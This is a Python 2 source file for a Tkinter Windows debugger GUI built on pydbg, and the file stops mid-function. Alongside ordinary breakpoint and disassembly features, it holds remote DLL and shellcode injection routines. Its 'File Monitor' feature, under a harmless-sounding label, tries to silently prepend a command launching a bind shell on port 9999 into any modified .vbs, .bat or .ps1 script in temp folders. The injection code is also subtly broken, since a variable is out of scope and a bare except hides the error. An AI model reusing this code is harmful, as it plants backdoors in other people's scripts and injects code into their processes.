# encoding=utf8
# Lots of imports for everything #
from debuggerDefines import *
from pydbg.defines import *
from pydbg import *
from cStringIO import StringIO
from ScrolledText import *
import tkFileDialog
import tkMessageBox
from Tkinter import *
from ttk import Frame, Button, Label, Style
global file, file2
from ctypes import *
import ctypes
import Queue
import threading
import ast
import win32clipboard
import os
import sys
import struct
import pydasm
import pefile
import time
import distorm3
import re
import debuggerUtilities as utils
import win32con
import win32api
import win32security
import win32file
import wmi
import pythoncom
import tempfile
import binascii
import psutil

version = 3.1
sleepTime = .00015

# Initialize some constants for Windows functions and my debugger
dbg = pydbg()
kernel32 = windll.kernel32

# List of words to search for when coloring text
highlightWords = {'0x1 ': 'red',
                  '[0x1-> EXCEPTION_DEBUG_EVENT]': 'red',
                  '0x2 ': 'purple',
                  '[0x2-> CREATE_THREAD_DEBUG_EVENT]': 'purple',
                  '0x3 ': 'blue',
                  '[0x3-> CREATE_PROCESS_DEBUG_EVENT]': 'blue',
                  '0x4 ': 'orange',
                  '[0x4-> EXIT_THREAD_DEBUG_EVENT]': 'orange',
                  '0x5 ': 'red',
                  '[0x5-> EXIT_PROCESS_DEBUG_EVENT]': 'red',
                  '0x6 ': 'blue',
                  'DLL Loaded': 'blue',
                  '[0x6-> LOAD_DLL_DEBUG_EVENT]': 'blue',
                  '0x7 ': 'orange',
                  '[0x7-> UNLOAD_DLL_DEBUG_EVENT]': 'orange',
                  '0x8 ': 'green',
                  '[0x8-> OUTPUT_DEBUG_STRING_EVENT]': 'green',
                  '0x9 ': 'red',
                  '[0x9-> RIP_EVENT]':'red',
                  'Access Violation Detected.': 'red',
                  'Event:': 'blue',
                  'CreateFileW': 'red',
                  'CreateFileA': 'blue',
                  '[-]': 'red',
                  '[+]': 'blue',
                  '[*]': 'green',
                  '[**]': 'green',
                  'PID:': 'blue'
                  }


class DebuggerMain(Frame):

    def __init__(self, parent):

        # Initialize the GUI
        Frame.__init__(self, parent)
        self.parent = parent
        self.h_process              =   None
        self.pid                    =   None
        self.debugger_active        =   False
        self.h_thread               =   None
        self.context                =   None
        self.breakpoints            =   {}
        self.first_breakpoint       =   True
        self.hardware_breakpoints   =   {}
        self.diss                   =   False
        self.OPEN                   =   None
        self.PID                    =   None
        self.nocolor                =   False
        self.crash                  =   False
        self.CheckRun               =   True
        self.BreakFunk              =   1
        self.breakmode              =   False
        self.pause                  =   False
        self.pauseModeVar           =   False
        self.coloring               =   True
        self.hide2                  =   False
        self.blocksize              =   1024

        # Here let's determine and store 
        # the default page size for the system
        # determine the system page size.
        system_info = SYSTEM_INFO()
        kernel32.GetSystemInfo(byref(system_info))
        self.page_size = system_info.dwPageSize
        
        # TODO: test
        self.guarded_pages      = []
        self.memory_breakpoints = {}
        
        self.open_state = False
        self.lib_mode_state = False
        self.crash_mode_state = False
        self.pydbg_mode = False
        self.counter = 0
        self.att = False

        # More GUI stuff
        self.style = Style()
        self.style.theme_use("default")
        self.textPad = ScrolledText(self)

        # Titles and stuff
        self.parent.title("Python Debugger")

        self.pack(fill=BOTH, expand=1)

        self.columnconfigure(1, weight=1)
        self.columnconfigure(3, pad=7)

        self.rowconfigure(3, weight=1)
        self.rowconfigure(5, pad=7)

        lbl = Label(self, text="Debugger:")
        lbl.grid(sticky=W, pady=4, padx=5)

        # Text Pad
        self.textPad.grid(row=1, column=0, columnspan=2, rowspan=4, padx=5, sticky=E + W + S + N)

        # Buttons
        start_button = Button(self, text="       Start       ", command=self.start)
        start_button.grid(row=1, column=3)

        register_button = Button(self, text="Register Info", command=self.popupTHREAD)
        register_button.grid(row=2, column=3, pady=4)

        detach_button = Button(self, text="Detach", command=self.detach2)
        detach_button.grid(row=3, column=3, pady=4, padx=10)

        help_button = Button(self, text="Help", command=self.about_command)
        help_button.grid(row=5, column=0, padx=5)

        close_button = Button(self, text="Close", command=self.onExit)
        close_button.grid(row=5, column=3)

        # Menu bar stuff
        menu_bar = Menu(self.parent)
        self.parent.config(menu=menu_bar)

        file_menu = Menu(menu_bar)
        file_menu.add_command(label="Attach", command=self.popupPID)
        file_menu.add_command(label="Open", command=self.popupOPEN2)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", underline=0, command=self.onExit)

        edit_menu = Menu(file_menu)
        edit_menu.add_command(label="Find", command=self.findAction)

        engine_mode_menu = Menu(file_menu)
        engine_mode_menu.add_command(label="Use Default Debug Engine", command=self.defualt)
        engine_mode_menu.add_command(label="Crash Mode(Special Engine)", command=self.crashMode)
        engine_mode_menu.add_command(label="Created Files Mode(Special Engine)", command=self.libMode)

        debug_menu = Menu(file_menu)
        debug_menu.add_cascade(label='Engine Modes', menu=engine_mode_menu, underline=0)
        debug_menu.add_command(label="Show Event Codes", command=self.popupEVENT1)
        debug_menu.add_command(label="Hide Debugger", command=self.hide)
        debug_menu.add_command(label="Change Registers", command=self.change)

        breakpoint_mode_menu = Menu(file_menu)
        breakpoint_mode_menu.add_command(label="Say 'Breakpoint Hit'", command=lambda: self.deal(1))
        breakpoint_mode_menu.add_command(label="SEH Unwind", command=lambda: self.deal(2))
        breakpoint_mode_menu.add_command(label="Stack Unwind", command=lambda: self.deal(3))
        breakpoint_mode_menu.add_command(label="Disassemble Around", command=lambda: self.deal(4))
        breakpoint_mode_menu.add_command(label="All of the above + extra :)", command=lambda: self.deal(5))

        inject_menu = Menu(file_menu)
        inject_menu.add_command(label="Inject dll", command=self.popupDLLWindow)
        inject_menu.add_command(label="Inject shellcode", command=self.codeInject)

        monitor_menu = Menu(file_menu)
        monitor_menu.add_command(label="File Monitor", command=self.fileMonitor)
        monitor_menu.add_command(label="Process Monitor", command=self.processMonitor)
        monitor_menu.add_command(label="List running processes", command=self.processList)

        breakpoint_menu = Menu(file_menu)
        breakpoint_menu.add_command(label="Show Breakpoints", command=self.showBreakpoints)
        breakpoint_menu.add_command(label="Pause at Breakpoints", command=self.pauseMode)
        breakpoint_menu.add_cascade(label="When a breakpoint is hit ", menu=breakpoint_mode_menu, underline=0)

        options_menu = Menu(file_menu)
        options_menu.add_command(label="Export", command=self.export)
        options_menu.add_command(label="Clear", command=self.clear)
        options_menu.add_command(label="Colors off", command=self.off)

        disassemble_menu = Menu(file_menu)
        disassemble_menu.add_command(label="Disassemble", command=self.disassemble3)
        disassemble_menu.add_command(label="Disassemble Around", command=self.disassemble_around)
        disassemble_menu.add_command(label="Show hex", command=self.show_hex)

        menu_bar.add_cascade(label="File", underline=0, menu=file_menu)
        menu_bar.add_cascade(label="Edit", underline=0, menu=edit_menu)
        menu_bar.add_cascade(label="Debug", underline=0, menu=debug_menu)
        menu_bar.add_cascade(label="Breakpoints", underline=0, menu=breakpoint_menu)
        menu_bar.add_cascade(label="Disassembly", underline=0, menu=disassemble_menu)
        menu_bar.add_cascade(label="Injection", underline=0, menu=inject_menu)
        menu_bar.add_cascade(label="Monitoring", underline=0, menu=monitor_menu)
        menu_bar.add_cascade(label="Options", underline=0, menu=options_menu)

        # Bind right click options
        self.rClickbinder(self.textPad)

        # TODO: Test for cause of crash when highlighting is enabled.
        # self.textPad.bind("<Key>", self.highlighter)

        line = "Welcome to the PyDebugger version %.1f" % version
        self.debug_print(line)

    def debug_print(self, line):
        print line
        try:
            line.strip("\n")
            line = "{}\n".format(line)
        except AttributeError:
            line = "[-] Error: Passed a list to print\n"
        self.textPad.insert('1.0', line)
        self.highlighter()
        time.sleep(sleepTime)

    def highlighter(self):
        # Iterates over list of certain words to color and colors them in the textpadq
        if not self.coloring:
            return False
        for trigger, color in highlightWords.iteritems():
            start_index = '1.0'
            while True:
                # search for occurrence of a trigger word
                start_index = self.textPad.search(trigger, start_index, END)
                if start_index:
                    # find end of k
                    end_index = self.textPad.index('%s+%dc' % (start_index, (len(trigger))))
                    # add tag to k
                    self.textPad.tag_add(trigger, start_index, end_index)
                    # and color it with the color
                    self.textPad.tag_config(trigger, foreground=color)
                    # reset start_index to continue searching
                    start_index = end_index
                else:
                    break
        return True

    def disassemble_around(self):
        if self.PID == self.OPEN:
            self.debug_print("[-] For disassembly around an address, you must be running it...")
            return False
        self.disassemble_around_window = popupWindowDISS(self.master)
        self.master.wait_window(self.disassemble_around_window.top)
        address = self.disassemble_around_window.value
        line = dbg.disasm_around(address)
        self.debug_print(line)

    def show_hex(self):
        if self.OPEN is None:
            self.debug_print("[-] You must open an executable first.")
            return False
        self.show_hex_window = popupWindowHEX(self.master)
        self.master.wait_window(self.show_hex_window.top)
        self.debug_print("[*] Converting...")
        t = threading.Thread(target=self.show_hex2)
        t.daemon = True
        t.start()

    def show_hex2(self):
        with open(self.OPEN, "rb") as f:
            block = f.read(self.blocksize)
            temp_str = ""
            for ch in block:
                    temp_str += hex(ord(ch))+" "
            self.debug_print(temp_str)
        
    def change(self):
        self.w=popupWindowCHANGE(self.master)
        self.master.wait_window(self.w.top)

    def hide(self):
        self.debug_print("[-] Warning, This only works with attaching, not opening - May cause errors.")
        self.debug_print("[*] Debugger will hide it's self after the first breakpoint, you will get a message.")
        self.hide2 = True
    
    def popupDLLWindow(self):
        print "Dll Injection only works for same bit process(ie. 32-32 bit or 64-64 bit), " \
              "trying to inject into a different bit process will produce an error"
        self.DLL = tkFileDialog.askopenfile(mode='r', title='Select a dll', filetypes=[("Dynamic Libraries", "*.dll")])
        self.DLL = self.DLL.name.strip()
        print self.DLL
        self.w = popupWindowDLL2(self.master)
        self.master.wait_window(self.w.top)
        self.dllPID = int(self.w.value)
        if self.dllPID == "":
            if self.PID:
                self.dllPID = self.PID
            else:
                tkMessageBox.showinfo("Error", "You must attach or input a pid to inject a dll")
        kernel32 = windll.kernel32
        PID = int(self.dllPID)
        dllPath = str(self.DLL)
        print "Dll path: %s" % dllPath
        pageRWPriv = 0x04
        PROCESS_ALL_ACCESS = 0x1F0FFF
        virtualMemory = 0x3000
        self.debug_print("[+] Starting DLL Injector")
        dllLength = len(self.DLL)  # get the length of the DLL PATH
        self.debug_print("[+] Getting process handle for PID:%d " % PID)
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
     
        if hProcess is None:
            self.debug_print("[+] Unable to get process handle")
            return False
        self.debug_print("[+] Allocating space for DLL PATH")
        dllPathAddress = kernel32.VirtualAllocEx(hProcess, 
                                                0,
                                                dllLength,
                                                virtualMemory,
                                                pageRWPriv)
        bool_Written = c_int(0)
        self.debug_print("[+] Writing DLL PATH to current process space")
        kernel32.WriteProcessMemory(hProcess,
                                    dllPathAddress,
                                    dllPath,
                                    dllLength,
                                    byref(bool_Written))
        self.debug_print("[+] Resolving Call Specific functions & libraries")
        kernel32DllHandler_addr = kernel32.GetModuleHandleA("kernel32")
        self.debug_print("[+] Resolved kernel32 library at 0x%08x" % kernel32DllHandler_addr)
        LoadLibraryA_func_addr = kernel32.GetProcAddress(kernel32DllHandler_addr,"LoadLibraryA")
        self.debug_print("[+] Resolve LoadLibraryA function at 0x%08x" %LoadLibraryA_func_addr)
        thread_id = c_ulong(0)  # for our thread id
        self.debug_print("[+] Creating Remote Thread to load our DLL")
        if not kernel32.CreateRemoteThread(hProcess,
                                    None,
                                    0,
                                    LoadLibraryA_func_addr,
                                    dllPathAddress,
                                    0,
                                    byref(thread_id)):
            line = kernel32.GetLastError()
            self.debug_print("[-] Injection Failed, exiting with error code:%s" % line)
            if line == "5" or line == 5:
                self.debug_print("[*] Revieved error code 5, you are trying to inject into 32 bit process from a 64 bit or vice versa...")
                return False
            elif line == "4":
                self.debug_print("[*] Revieved error code 4, you are trying to inject into a different priveleged process")
                return False
        else:
            line = kernel32.GetLastError()
            self.debug_print("[+] Remote Thread 0x%08x created, DLL code injected with code:%s" % (thread_id.value, line))
            return True
            
    def findAction(self):
            t2 = self.top = Toplevel(self)
            #t2 = tk.Toplevel(root)
            t2.title('Find Text')
            t2.geometry('280x80')
            # Make sure the window is drawn on top of the root window with transient
            t2.transient(self)
            Label(t2, text='Find All:').grid(row=0, column=0, sticky='e')
            v = StringVar()
            search_phrase_box = Entry(t2, width=25, textvariable=v)
            search_phrase_box.grid(row=0, column=1, padx=2, sticky='we')
            # Shift the cursor's focus to the new Entry widget
            search_phrase_box.focus_set()

            c = IntVar()
            Checkbutton(t2, text='Ignore Case', variable=c).grid(row=1, column=1,sticky='e', padx=2, pady=2)
            Button(t2, text='Find All', underline=0, command=lambda: self.serachFor(v.get(),c.get(), self.textPad, t2, search_phrase_box)).grid(row=0, column=2, sticky='e'+'w', padx=2, pady=2)
            def close_search():
                textPad.tag_remove('match', '1.0', END)
                t2.destroy()
                # Override the close button
                t2.protocol('WM_DELETE_WINDOW', close_search)

    def serachFor(self,needle,cssnstv, textPad, t2,e) :
            self.textPad.tag_remove('match', '1.0', END)
            count = 0
            if needle:
                    position = '1.0'
                    while True:
                        position = self.textPad.search(needle, position, nocase=cssnstv, stopindex=END)
                        if not position: break
                        lastposition = '%s+%dc' % (position, len(needle))
                        self.textPad.tag_add('match', position, lastposition)
                        count += 1
                        position = lastposition
                    self.textPad.tag_config('match', foreground='yellow', background='#019875')
            self.textPad.focus_set()
            t2.title('%d found' % count)
            
    def processList(self):
        self.clear()
        self.debug_print("[+] Getting Process List...")
        for (pid, name) in dbg.enumerate_processes():
            if (pid != os.getpid()):
                self.debug_print("[+] Name:%s PID:%s" % (name, pid))
            else:
                self.debug_print("[+] Name:%s PID:%s     <==[Current Debugger Process] " % (name, pid))
        
    def codeInject(self):
        print "[-] Code Injection only works for same bit process(ie. 32-32 bit or 64-64 bit), " \
              "trying to inject into a different bit process will produce an error"
        self.w=popupWindowINJECT(self.master)
        self.master.wait_window(self.w.top)
        self.shellcode = self.w.value.strip().strip("\n").strip("\r")
        self.w=popupWindowDLL2(self.master)
        self.master.wait_window(self.w.top)
        self.PID = int(self.w.value)
        page_rwx_value = 0x40
        process_all = 0x1F0FFF
        memcommit = 0x00001000
        kernel32_variable = windll.kernel32
        shellcode_length = len(self.shellcode)
        self.debug_print("[*] Shellcode length:%s" % shellcode_length)
        self.debug_print("[+] Attaching to process")
        process_handle = kernel32_variable.OpenProcess(process_all, False, self.PID)
        if process_handle is None:
            self.debug_print("[-] Unable to get process handle")
            return False
        memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
        kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, self.shellcode, shellcode_length, 0)
        self.debug_print("[+] Creating remote thread")
        kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
        self.debug_print("[+] Shellcode should be injected now")



    def fileMonitor(self):
        self.w=popupWindowDIR(self.master)
        self.master.wait_window(self.w.top)
        self.DIR = self.w.value
        if self.DIR == "":
            dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]
        else:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir(),self.DIR]
        # file modification constants
        FILE_CREATED      = 1
        FILE_DELETED      = 2
        FILE_MODIFIED     = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO   = 5

        # extension based code snippets to inject
        file_types         = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker","Start-Process \"%s\"" % command]
        for path in dirs_to_monitor:
            monitor_thread = threading.Thread(target=self.startFileMonitor,args=(path,))
            monitor_thread.daemon = True
            self.debug_print( "[+] Spawning monitoring thread for path: %s" % path)
            monitor_thread.start()

    def injectCode(self,full_filename,extension,contents):
    # is our marker already in the file?
        if file_types[extension][0] in contents:
            return
    # no marker let's inject the marker and code
        full_contents  = file_types[extension][0]
        full_contents += file_types[extension][1]
        full_contents += contents
        fd = open(full_filename,"wb")
        fd.write(full_contents)
        fd.close()
        self.debug_print( "[\o/] Injected code.")
        return
    
    def startFileMonitor(self,path_to_watch):
        # we create a thread for each monitoring run
        FILE_LIST_DIRECTORY = 0x0001
        FILE_CREATED      = 1
        FILE_DELETED      = 2
        FILE_MODIFIED     = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO   = 5
        file_types         = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker","Start-Process \"%s\"" % command]

        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None)
        while 1:
            try:
                results = win32file.ReadDirectoryChangesW(
                    h_directory,
                    1024,
                    True,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                    win32con.FILE_NOTIFY_CHANGE_SIZE |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SECURITY,
                    None,
                    None
                    )
                for action,file_name in results:
                    full_filename = os.path.join(path_to_watch, file_name)
                    if action == FILE_CREATED:
                        line = ("[+] Created %s" % full_filename)
                        self.debug_print(line)
                    elif action == FILE_DELETED:
                        line = ("[-] Deleted %s" % full_filename)
                        self.debug_print(line)
                    elif action == FILE_MODIFIED:
                        line = ("[*] Modified %s" % full_filename)
                        self.debug_print(line)
                    # dump out the file contents
                        line = ("[vvv] Dumping contents...")
                        self.debug_print(line)
                        try:
                            fd = open(full_filename,"rb")
                            contents = fd.read()
                            fd.close()
                            self.debug_print( contents)
                            line = ("[^^^] Dump complete.")
                            self.debug_print(line)
                        except:
                            line = ("[!!!] Failed.")
                            self.debug_print(line)
                    
                        filename,extension = os.path.splitext(full_filename)
                    
                        if extension in file_types:
                            self.injectCode(full_filename,extension,contents)
                    
                    elif action == FILE_RENAMED_FROM:
                        line = ("[>] Renamed from: %s" % full_filename)
                        self.debug_print(line)
                    elif action == FILE_RENAMED_TO:
                        line = ("[<] Renamed to: %s" % full_filename)
                        self.debug_print(line)
                    else:
                        line = ("[?] Unknown: %s" % full_filename)
                        self.debug_print(line)
            except:
                pass

    def processMonitor(self):
        self.debug_print("[+] Starting process monitor")
        t = threading.Thread(target=self.processMonitor2)
        t.daemon = True
        t.start()

    def getProcessPrivilages(self, pid):
        try:
        # obtain a handle to the target process
            hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)

        # open the main process token
            htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)

        # retrieve the list of privileges enabled
            privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)

        # iterate over privileges and output the ones that are enabled
            priv_list = []
            for priv_id, priv_flags in privs:
                # check if the privilege is enabled
                if priv_flags == 3:
                    priv_list.append(win32security.LookupPrivilegeName(None, priv_id))
        except:
            priv_list.append("N/A")
        return "|".join(priv_list)

    def processMonitor2(self):
        pythoncom.CoInitialize()
        c = wmi.WMI()
        process_watcher = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = process_watcher()

                proc_owner  = new_process.GetOwner()
                proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
                create_date = new_process.CreationDate
                executable  = new_process.ExecutablePath
                cmdline     = new_process.CommandLine
                pid         = new_process.ProcessId
                parent_pid  = new_process.ParentProcessId

                privileges  = self.getProcessPrivilages(pid)

                process_log_message = "\n[+] Date: %s,\n[+] Process Owner:%s,\n[+] Executable:%s,\n[+] Cmd line opts:%s,\n[+] PID:%s,\n[+] Parent PID:%s,\n[+] Privs:%s" % (create_date, proc_owner, executable, cmdline, pid, parent_pid,privileges)

                self.debug_print( "%s\r\n" % process_log_message)
            except:
                pass

    def dummy(self):
        self.debug_print("Not ready yet...")

    def disassem(self, dbg):
        self.debug_print("[+]Hit a breakpoint at %s" % dbg.exception_address)
        line = dbg.disasm_around(dbg.exception_address)
        synop = "\nDissasembled around breakpoint instruction\n"
        for (ea, inst) in line:
            synop += "\t0x%08x %s\n" % (ea, inst)
        self.debug_print(synop)
        self.wait()
        return DBG_CONTINUE

    def pauseMode(self):
        self.pauseModeVar = True
        self.debug_print("[*]Will pause at breakpoints")

    def deal(self, num):
        self.BreakFunk = num
        return True

    def wait(self):
        if self.pauseModeVar:
            self.breakmode = True
            self.pause = True
            fill = 1
            while self.pause:
                fill = fill + 1 - 1
            self.debug_print("[*] Continuing")

    def SEH_unwind(self, dbg):
        self.debug_print("[+]Hit a breakpoint at %s" % dbg.exception_address)
        #self.debug_print("[+]SEH Chain")
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.debug_print(synopsis)
        self.wait()
        return DBG_CONTINUE

    def dump_info(self, dbg):
        self.debug_print("[+]Hit a breakpoint at %s" % dbg.exception_address)
        info = dbg.stack_unwind()
        synop1 = "\nStack Unwind\n"
        for entry in info:
                synop1 += "\t%s\n" % entry
        self.debug_print(synop1)
        self.wait()
        return DBG_CONTINUE

    def all_info(self, dbg):
        self.debug_print("[+]Hit a breakpoint at %s" % dbg.exception_address)
        #self.debug_print("[+]SEH Chain")
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.debug_print(synopsis)
        info = dbg.stack_unwind()
        synop1 = "\nStack Unwind\n"
        for entry in info:
                synop1 += "\t%s\n" % entry
        self.debug_print(synop1)
        line = dbg.disasm_around(dbg.exception_address)
        synop = "\nDissasembled around breakpoint instruction\n"
        for (ea, inst) in line:
            synop += "\t0x%08x %s\n" % (ea, inst)
        self.debug_print(synop)
        i = 0;
        for thread_id in dbg.enumerate_threads():
            thread_handle  = dbg.open_thread(thread_id)
            context = dbg.get_thread_context(thread_handle)
            self.debug_print("[*] Dumping registers for threads:")
            self.debug_print("[**] Thread ID:%03d: %08x EIP: %08x" % (i,thread_handle,context.Eip))
            self.debug_print("[**] Thread ID:%03d:: %08x ESP: %08x" % (i,thread_handle,context.Esp))
            self.debug_print("[**] Thread ID:%03d:: %08x EBP: %08x" % (i,thread_handle,context.Ebp))
            self.debug_print("[**] Thread ID:%03d:: %08x EAX: %08x" % (i,thread_handle,context.Eax))
            self.debug_print("[**] Thread ID:%03d:: %08x EBX: %08x" % (i,thread_handle,context.Ebx))
            self.debug_print("[**] Thread ID:%03d:: %08x ECX: %08x" % (i,thread_handle,context.Ecx))
            self.debug_print("[**] Thread ID:%03d:: %08x EDX: %08x" % (i,thread_handle,context.Edx))
            self.debug_print("[**] Thread ID:%03d:: %08x EDI: %08x" % (i,thread_handle,context.Edi))
            self.debug_print("[**] Thread ID:%03d:: %08x ESI: %08x" % (i,thread_handle,context.Esi))
            i += 1
        self.wait()
        return DBG_CONTINUE

    def showBreakpoints(self):
        try:
            file = open("Breakpoints.txt", "r")
        except:
            self.debug_print("Could not find Breakpoints.txt, no breakpoint setting...")
            pass
        for line in file.readlines():
            line = re.sub("[^\w]", " ",  line).split()
            self.debug_print("[*] Breakpoint on %s in %s." % (line[2], line[0] + "." + line[1]))

    def get_dlls(self):
        for modules in pydbg().enumerate_modules():
            if self.CheckRun:
                self.debug_print("[*] Executable > %s" % modules[0])
                self.CheckRun = False
            else:
                self.debug_print("[+] DLL Loaded(%s) > %s" % (modules[1],modules[0]))
            time.sleep(.005)

    def handler_breakpoint(self, dbg):
        self.debug_print("[+] Hit a breakpoint")
        print dbg
        return DBG_CONTINUE

    def InitPyDBG(self):
        def one(dbg):
            self.debug_print("[0x1-> EXCEPTION_DEBUG_EVENT]")
            return DBG_CONTINUE
        def two(dbg):
            self.debug_print("[0x2-> CREATE_THREAD_DEBUG_EVENT]")
            return DBG_CONTINUE
        def three(dbg):
            self.debug_print("[0x3-> CREATE_PROCESS_DEBUG_EVENT]")
            return DBG_CONTINUE
        def four(dbg):
            self.debug_print("[0x4-> EXIT_THREAD_DEBUG_EVENT]")
            return DBG_CONTINUE
        def five(dbg):
            self.debug_print("[0x5-> EXIT_PROCESS_DEBUG_EVENT]")
            return DBG_CONTINUE
        def six(dbg):
            last_dll = dbg.get_system_dll(-1)
            self.debug_print("[0x6-> LOAD_DLL_DEBUG_EVENT] > 0x%08x %s" % (last_dll.base, last_dll.path))
            return DBG_CONTINUE
        def seven(dbg):
            self.debug_print("[0x7-> UNLOAD_DLL_DEBUG_EVENT]")
            return DBG_CONTINUE
        def eight(dbg):
            self.debug_print("[0x8-> OUTPUT_DEBUG_STRING_EVENT]")
            return DBG_CONTINUE
        def nine(dbg):
            self.debug_print("[0x9-> RIP_EVENT]")
            return DBG_CONTINUE
        dbg.set_callback(EXCEPTION_DEBUG_EVENT,one)
        dbg.set_callback(CREATE_THREAD_DEBUG_EVENT,two)
        dbg.set_callback(CREATE_PROCESS_DEBUG_EVENT,three)
        dbg.set_callback(EXIT_THREAD_DEBUG_EVENT,four)
        dbg.set_callback(EXIT_PROCESS_DEBUG_EVENT,five)
        dbg.set_callback(LOAD_DLL_DEBUG_EVENT,six)
        dbg.set_callback(UNLOAD_DLL_DEBUG_EVENT,seven)
        dbg.set_callback(OUTPUT_DEBUG_STRING_EVENT,eight)
        dbg.set_callback(RIP_EVENT,nine)

    def highlighter2(self):
        pass

    def off(self):
        self.coloring = False

    def single_step_handler(self, dbg):
        global instruction_count
        global crash_encountered
        if crash_encountered:
            if instruction_count == MAX_INSTRUCTIONS:
                dbg.single_step(False)
                return DBG_CONTINUE
            else:
# Disassemble this instruction
                instruction = dbg.disasm(dbg.context.Eip)
                self.debug_print( "#%d\t0x%08x : %s" % (instruction_count,dbg.context.Eip,
instruction))
                instruction_count += 1
                dbg.single_step(True)
            return DBG_CONTINUE

    def danger_handler(self, dbg):
        # We want to print out the contents of the stack; that's about it
        # Generally there are only going to be a few parameters, so we will
        # take everything from ESP to ESP+20, which should give us enough
        # information to determine if we own any of the data
        esp_offset = 0
        self.debug_print("[*] Hit %s" % dangerous_functions_resolved[dbg.context.Eip])
        self.debug_print( "=================================================================" )
        while esp_offset <= 20:
            parameter = dbg.smart_dereference(dbg.context.Esp + esp_offset)
            self.debug_print( "[ESP + %d] => %s" % (esp_offset, parameter))
            esp_offset += 4
        self.debug_print( "=================================================================" )
        dbg.suspend_all_threads()
        dbg.process_snapshot()
        dbg.resume_all_threads()
        self.highlighter()
        return DBG_CONTINUE

    def hide_bp(self, dbg):
        if dbg.first_breakpoint:
            dbg.hide_debugger()
            self.debug_print("[+] ========Debugger hidden!========")
        return DBG_CONTINUE

    def breakpointset(self, debugger):
        try:
            file = open("Breakpoints.txt", "r")
        except:
            self.debug_print("Could not find Breakpoints.txt, no breakpoint setting...")
            return False
        if self.hide2:
            dbg.set_callback(EXCEPTION_BREAKPOINT, self.hide_bp)
        for line in file.readlines():
            try:
                line = re.sub("[^\w]", " ",  line).split()
                if debugger == "pydbg":
                    func_address = dbg.func_resolve(line[0],line[2])
                    self.debug_print("Address of %s(%s) is: 0x%08x" % (line[2], line[0], func_address))
                    if self.BreakFunk == 1:
                        dbg.bp_set(func_address, description=line[2],handler=self.handler_breakpoint)
                    elif self.BreakFunk == 2:
                        self.debug_print("[*] Using 'SEH Unwind' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.SEH_unwind)
                    elif self.BreakFunk == 3:
                        self.debug_print("[*] Using 'Dump Heap Info' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.dump_info)
                    elif self.BreakFunk == 4:
                        self.debug_print("[*] Using 'Disassem Around' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.disassem)
                    elif self.BreakFunk == 5:
                        self.debug_print("[*] Using 'All info handler'")
                        dbg.bp_set(func_address, description=line[2],handler=self.all_info)
                    self.debug_print("Set Breakpoint on %s at address 0x%08x" % (line[2], func_address))
            except:
                self.debug_print("[-] Error setting breakpoint on %s(%s) at address 0x%08x" % (line[2], line[0], func_address))
        self.debug_print("[*] Done with breakpoints") 
            
            
    def debug_print(self, line):
        print line
        try:
            line.strip("\n")
            line = "{}\n".format(line)
            #line = "" + line
        except:
            pass   #Probably a list 
        self.textPad.insert('1.0', line)
        if self.nocolor:
            return True
        else:
            self.highlighter()
        time.sleep(sleepTime)

    def print3(self, line):
        line.strip("\n")
        self.textPad.insert('1.0', line)
        self.highlighter()

    def crashMode(self):
        self.debug_print("[+] Enabling crash mode")
        self.crash_mode_state = True
        self.lib_mode_state = False
        self.pydbg_mode = True

    def libMode(self):
        self.debug_print("[+] Enabling Created Files mode")
        self.lib_mode_state = True
        self.crash_mode_state = False
        self.pydbg_mode = True

    def defualt(self):
        self.debug_print("[+] Using default mode")
        self.lib_mode_state = False
        self.pydbg_mode = False
        self.crash_mode_state = False

    def disassemble3(self):
        label = tkMessageBox.showinfo("Info", "This will not print anything until it is done, so don't go anywhere! After its done hit Options then Export and it will send it to a file.")
        self.debug_print("This may take a while...")
        t = threading.Thread(target=self.disassemble2)
        t.daemon = True
        t.start()

    def disassemble2(self):
        if self.OPEN is None:
            self.debug_print("[-]Error: You must open an executable first")
            return False
        self.diss = True
        num_bytes = os.path.getsize(self.OPEN)
        dt = distorm3.Decode32Bits
        filename = self.OPEN
        offset   = 0
